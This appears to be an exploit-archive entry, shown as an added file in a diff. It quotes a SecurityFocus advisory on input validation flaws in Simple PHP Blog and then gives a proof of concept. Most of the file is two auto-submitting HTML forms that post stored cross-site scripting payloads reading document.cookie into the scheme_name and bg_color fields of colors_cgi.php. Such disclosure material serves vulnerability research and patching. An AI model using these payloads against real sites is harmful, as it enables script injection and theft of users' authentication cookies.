@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/15283/info
+  
+Simple PHP Blog is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+  
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+<form action="http://your-server/path-to-sphpblog/colors_cgi.php" method="post">
+<input name="save_btn" value="1"/>
+<input name="scheme_name" value='"></option></select><script>alert(document.cookie)</script>'/>
+<input name="scheme_file" value="blabla"/>
+<input type="submit"/>
+</form>
+
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action="http://your-server/path-to-sphpblog/colors_cgi.php" method="post">
+<input name="save_btn" value="1"/>
+<input name="scheme_name" value="myscheme"/>
+<input name="scheme_file" value="blabla"/>
+<input name="bg_color" value='"><script>alert(document.cookie)</script>'/>
+<input type="submit"/>
+</form>
+
+<script type="text/javascript">
+document.forms[0].submit();
+</script> 
